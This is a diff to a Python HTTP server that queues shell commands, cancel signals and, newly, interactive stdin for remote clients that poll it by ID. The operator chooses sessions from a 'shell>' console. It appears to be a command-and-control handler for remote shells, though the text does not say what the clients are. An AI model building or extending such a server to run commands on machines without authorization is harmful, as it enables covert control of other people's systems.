@@ -16,7 +16,7 @@ import queue
 import signal
 import readline  # enables arrow-key history in input()
 
-# Per-client state: { client_id: { last_checkin, pending_command, pending_signal, command_running } }
+# Per-client state
 clients = {}
 lock = threading.Lock()
 active_client = None
@@ -30,6 +30,7 @@ def get_or_create_client(client_id):
             "last_checkin": 0,
             "pending_command": None,
             "pending_signal": None,
+            "pending_stdin": [],      # queued stdin lines for interactive commands
             "command_running": False,
         }
     return clients[client_id]
@@ -38,6 +39,9 @@ def get_or_create_client(client_id):
 def get_prompt():
     """Return the current prompt string."""
     if active_client:
+        client = clients.get(active_client)
+        if client and client.get("command_running"):
+            return f"{active_client} [interactive]> "
         return f"{active_client}> "
     return "shell> "
 
@@ -53,6 +57,7 @@ def cancel_shortcut(signum, frame):
         if client and (client["command_running"] or client["pending_command"]):
             client["pending_signal"] = "cancel"
             client["pending_command"] = None
+            client["pending_stdin"] = []
             sys.stdout.write(f"\r\033[K[*] Cancel signal sent to {active_client} (Ctrl+\\).\n" + get_prompt())
         else:
             sys.stdout.write(f"\r\033[K[*] No command running on {active_client}.\n" + get_prompt())
@@ -122,6 +127,17 @@ class Handler(BaseHTTPRequestHandler):
                 client["pending_signal"] = None
             self._respond(200, sig.encode())
 
+        elif path == "/stdin":
+            if not client_id:
+                self._respond(200, b"")
+                return
+            with lock:
+                client = get_or_create_client(client_id)
+                lines = client["pending_stdin"]
+                data = "\n".join(lines) if lines else ""
+                client["pending_stdin"] = []
+            self._respond(200, data.encode())
+
         elif path == "/ping":
             if client_id:
                 with lock:
@@ -152,6 +168,7 @@ class Handler(BaseHTTPRequestHandler):
                 with lock:
                     client = get_or_create_client(client_id)
                     client["command_running"] = False
+                    client["pending_stdin"] = []
             # Use blocking put with timeout for /result — must not be silently dropped
             try:
                 result_queue.put((client_id, "result", body), timeout=2)
@@ -225,10 +242,18 @@ def input_loop():
                 if client and (client["command_running"] or client["pending_command"]):
                     client["pending_signal"] = "cancel"
                     client["pending_command"] = None
+                    client["pending_stdin"] = []
                     print(f"[*] Cancel signal queued for {active_client}.")
                 else:
                     print(f"[*] No command running on {active_client}.")
             continue
+
+        # While a command is running, forward operator input as stdin.
+        with lock:
+            active_state = clients.get(active_client) if active_client else None
+            if active_state and active_state["command_running"]:
+                active_state["pending_stdin"].append(cmd)
+                continue
 
         if stripped == "sessions":
             with lock:
@@ -292,6 +317,7 @@ def input_loop():
                 match = _resolve_client(target)
                 if match:
                     clients[match]["pending_command"] = "exit"
+                    clients[match]["pending_stdin"] = []
                     print(f"[*] Exit command sent to {match}.")
                     if active_client == match:
                         active_client = None
@@ -335,7 +361,7 @@ def input_loop():
             print("[*] Shutting down server.")
             sys.exit(0)
 
-        # --- Remote command ---
+        # --- Remote command or stdin ---
         with lock:
             if not active_client:
                 print("[*] No active client. Use 'use <id>' to select one.")
@@ -344,10 +370,15 @@ def input_loop():
             if not client:
                 print(f"[!] Client {active_client} not found.")
                 continue
-            if client["pending_command"]:
-                print(f"[!] Previous command on {active_client} still pending — overwriting.")
-            client["pending_command"] = cmd
-            client["command_running"] = True
+            if client["command_running"]:
+                # Command already running — route input as stdin
+                client["pending_stdin"].append(cmd)
+            else:
+                if client["pending_command"]:
+                    print(f"[!] Previous command on {active_client} still pending — overwriting.")
+                client["pending_stdin"] = []
+                client["pending_command"] = cmd
+                client["command_running"] = True
 
 
 def status_printer():
